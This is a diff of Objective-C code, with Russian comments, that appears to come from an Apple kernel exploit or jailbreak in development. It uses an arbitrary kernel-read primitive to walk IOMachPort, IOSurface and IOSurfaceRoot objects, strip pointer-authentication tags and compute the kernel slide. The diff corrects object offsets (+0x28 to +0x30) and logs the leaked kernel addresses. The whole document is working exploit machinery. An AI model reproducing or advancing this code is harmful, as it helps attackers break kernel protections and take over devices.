@@ -5914,24 +5914,26 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
             return kpLooksLikeKernelPointer(kobj) ? kobj : (uint64_t)0;
         };
         uint64_t (^surfFromSendRight)(uint64_t) = ^uint64_t(uint64_t kobj) {
-            // 1.9.149: kobj = IOMachPort (обёртка порта, раунд 29) — реальный
-            // объект за [+0x28]. Два уровня: поля kobj → c (SendRight/UC),
-            // поля c → c2 (IOSurface). Верификация surfFast (pfn-цепочка).
+            // 1.9.151: kobj = IOMachPort; +0x28 = fPort (ipc_port), +0x30 = fObject
+            // (раунд 30, PAC addrDiv disc 0xba96 — untag даёт верный VA). Скан:
+            // сам kobj, fObject, и поля обоих (0x100) — поверхность по surfFast.
             if (surfFull(kobj)) return kobj;
-            for (uint32_t o = 0; o < 0x100; o += 8) {
-                uint64_t c = kp_untag_ptr(early_kread64(kobj + o));
-                if (surfFast(c)) return c;
-                if (!kpLooksLikeKernelPointer(c)) continue;
-                for (uint32_t o2 = 0; o2 + 8 <= 0x30; o2 += 8) {
-                    uint64_t c2 = kp_untag_ptr(early_kread64(c + o2));
-                    if (surfFast(c2)) return c2;
+            uint64_t fobj = kp_untag_ptr(early_kread64(kobj + 0x30));
+            uint64_t bases[2] = { kobj, fobj };
+            for (int b = 0; b < 2; b++) {
+                uint64_t base = bases[b];
+                if (!kpLooksLikeKernelPointer(base)) continue;
+                if (surfFast(base)) return base;
+                for (uint32_t o = 0; o + 8 <= 0x100; o += 8) {
+                    uint64_t c = kp_untag_ptr(early_kread64(base + o));
+                    if (surfFast(c)) return c;
                 }
             }
             return (uint64_t)0;
         };
         uint64_t (^surfFromUC)(uint64_t) = ^uint64_t(uint64_t uc) {
             for (uint32_t hop = 0; hop < 2; hop++) {
-                uint64_t base = hop ? kp_untag_ptr(early_kread64(uc + 0x28)) : uc;
+                uint64_t base = hop ? kp_untag_ptr(early_kread64(uc + 0x30)) : uc;
                 if (!kpLooksLikeKernelPointer(base)) continue;
                 uint64_t coll = kp_untag_ptr(early_kread64(base + 0xe8));
                 if (!kpLooksLikeKernelPointer(coll)) continue;
@@ -5964,18 +5966,23 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                           kpLooksLikeKernelPointer(u)
                             ? [NSString stringWithFormat:@" → [+0x10]=%#x surfFast=%d", (uint32_t)early_kread64(u + 0x10), (int)surfFast(u)] : @""]);
             }
-            // раунд 29: kobj = IOMachPort (обёртка), реальный sub-object за +0x28
-            uint64_t hop = kp_untag_ptr(early_kread64(smpKobj + 0x28));
-            uint64_t hopVt = kpLooksLikeKernelPointer(hop) ? kp_untag_ptr(early_kread64(hop)) : 0;
-            kpNote(r, [NSString stringWithFormat:@"    IOMachPort+0x28 → %#llx vt=%#llx (file %#llx%@)",
-                      (unsigned long long)hop, (unsigned long long)hopVt,
-                      (unsigned long long)(hopVt ? hopVt - kslide : 0),
-                      hopVt == vtSendRight ? @" = SendRight!" : @""]);
-            if (kpLooksLikeKernelPointer(hop)) {
-                for (uint32_t o = 0; o + 8 <= 0x30; o += 8) {
-                    uint64_t q = early_kread64(hop + o);
+            // раунд 30: IOMachPort: +0x28 = fPort (ipc_port), +0x30 = fObject.
+            // kotype = [fPort]&0x3ff (0x1b export/0x1d connect/0x1e service).
+            uint64_t fport = kp_untag_ptr(early_kread64(smpKobj + 0x28));
+            uint32_t kotype = kpLooksLikeKernelPointer(fport) ? ((uint32_t)early_kread64(fport) & 0x3ff) : 0;
+            uint64_t fobj = kp_untag_ptr(early_kread64(smpKobj + 0x30));
+            uint64_t fobjVt = kpLooksLikeKernelPointer(fobj) ? kp_untag_ptr(early_kread64(fobj)) : 0;
+            kpNote(r, [NSString stringWithFormat:@"    IOMachPort: fPort=%#llx kotype=0x%x fObject=%#llx vt=%#llx (file %#llx%@)",
+                      (unsigned long long)fport, kotype, (unsigned long long)fobj,
+                      (unsigned long long)fobjVt,
+                      (unsigned long long)(fobjVt ? fobjVt - kslide : 0),
+                      fobjVt == vtSendRight ? @" = SendRight!" : @""]);
+            if (kpLooksLikeKernelPointer(fobj)) {
+                for (uint32_t o = 0; o + 8 <= 0x100; o += 8) {
+                    uint64_t q = early_kread64(fobj + o);
                     uint64_t u = kp_untag_ptr(q);
-                    kpNote(r, [NSString stringWithFormat:@"    hop+0x%02x: raw=%#018llx untag=%#018llx%@",
+                    if (!kpLooksLikeKernelPointer(u) && !q) continue;
+                    kpNote(r, [NSString stringWithFormat:@"    fobj+0x%02x: raw=%#018llx untag=%#018llx%@",
                               o, (unsigned long long)q, (unsigned long long)u,
                               kpLooksLikeKernelPointer(u)
                                 ? [NSString stringWithFormat:@" → [+0x10]=%#x surfFast=%d", (uint32_t)early_kread64(u + 0x10), (int)surfFast(u)] : @""]);
@@ -6114,9 +6121,9 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
             return c;
         };
         if (vcVA) {
-            // 1.9.149: vcVA = IOMachPort-обёртка (раунд 29) — реальный клиент за
-            // [+0x28]. 1.9.148 искал scheduler внутри обёртки → scheduler=0.
-            uint64_t vcReal = kp_untag_ptr(early_kread64(vcVA + 0x28));
+            // 1.9.151: vcVA = IOMachPort — реальный клиент = fObject @ +0x30
+            // (раунд 30; +0x28 = fPort — сам ipc_port, отсюда obj(+0xe8)=0 в 1.9.149).
+            uint64_t vcReal = kp_untag_ptr(early_kread64(vcVA + 0x30));
             if (!kpLooksLikeKernelPointer(vcReal)) vcReal = vcVA;
             uint64_t vcRealVt = kpLooksLikeKernelPointer(vcReal) ? kp_untag_ptr(early_kread64(vcReal)) : 0;
             uint64_t ks2 = kconstant(base) - 0xfffffff007004000ULL;
@@ -6142,7 +6149,7 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                     }
                 }
             }
-            kpNote(r, [NSString stringWithFormat:@"  op-entry oracle: clientVA=%#llx real(+0x28)=%#llx realVt(file)=%#llx obj(+0xe8)=%#llx scheduler=%#llx (кандидатов=%u)",
+            kpNote(r, [NSString stringWithFormat:@"  op-entry oracle: clientVA=%#llx fObject=%#llx fObjVt(file)=%#llx obj(+0xe8)=%#llx scheduler=%#llx (кандидатов=%u)",
                       (unsigned long long)vcVA, (unsigned long long)vcReal,
                       (unsigned long long)(vcRealVt ? vcRealVt - ks2 : 0),
                       (unsigned long long)obj, (unsigned long long)schedVA, cn]);
@@ -6256,13 +6263,13 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
         io_service_t isvc = IOServiceGetMatchingService(kIOMasterPortDefault,
                                                         IOServiceMatching("IOSurfaceRoot"));
         rootVA = isvc ? kpM2TClientVA(r, isTable, isvc, @"iosurfroot") : 0;
-        // 1.9.150: rootVA = IOMachPort-обёртка (0x38!) — реальный IOSurfaceRoot за
-        // [+0x28] (раунд 29). Без хопа реестр читал соседнюю zone-память по
-        // +0x408/+0x418/+0x440 — отсюда вечные нули.
+        // 1.9.151: rootVA = IOMachPort-обёртка (0x38!) — реальный IOSurfaceRoot =
+        // fObject @ +0x30 (раунд 30; +0x28 = fPort — сам ipc_port!). Без хопа
+        // реестр читал соседнюю zone-память по +0x408/+0x418/+0x440 — вечные нули.
         uint64_t rootWrap = rootVA;
-        uint64_t rootReal = kp_untag_ptr(early_kread64(rootVA + 0x28));
+        uint64_t rootReal = kp_untag_ptr(early_kread64(rootVA + 0x30));
         if (kpLooksLikeKernelPointer(rootReal)) rootVA = rootReal;
-        kpNote(r, [NSString stringWithFormat:@"  IOSurfaceRoot: svc=0x%x wrap=%#llx rootVA(+0x28)=%#llx taskVA=%#llx",
+        kpNote(r, [NSString stringWithFormat:@"  IOSurfaceRoot: svc=0x%x wrap=%#llx rootVA(fObject)=%#llx taskVA=%#llx",
                   isvc, (unsigned long long)rootWrap, (unsigned long long)rootVA, (unsigned long long)taskVA]);
         if (isvc) IOObjectRelease(isvc);
         if (rootVA && taskVA) {
